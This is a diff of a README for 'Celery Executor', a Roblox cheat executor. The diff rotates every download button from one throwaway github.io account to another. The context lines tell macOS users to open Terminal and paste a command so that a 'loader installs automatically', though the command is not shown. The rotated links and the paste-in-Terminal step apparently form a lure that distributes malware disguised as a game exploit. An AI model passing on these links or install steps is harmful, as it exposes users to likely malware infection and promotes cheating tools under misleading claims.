@@ -10,8 +10,8 @@ Celery Executor achieves a perfect 100% UNC score — the only free executor to 
 
 <div align="center">
 
-[![Download Celery Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download Celery Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
 
 </div>
 
@@ -41,14 +41,14 @@ Celery Executor achieves a perfect 100% UNC score — the only free executor to 
 4. **🎮 Join any Roblox game**
 5. **⚡ Click Inject** — load your script and Execute
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20CELERY%20🔻-purple?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20CELERY%20🔻-purple?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
 
 ### 🍎 macOS
 1. Press `⌘ + Space`, type **Terminal**, hit Enter
 2. Paste the command and press Enter
 3. Follow the prompts — the loader installs automatically
 
-[![Mac Download](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
+[![Mac Download](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
 
 ---
 
@@ -84,5 +84,5 @@ Celery Executor achieves a perfect 100% UNC score — the only free executor to 
 
 ---
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20CELERY%20🔻-purple?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20CELERY%20🔻-purple?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
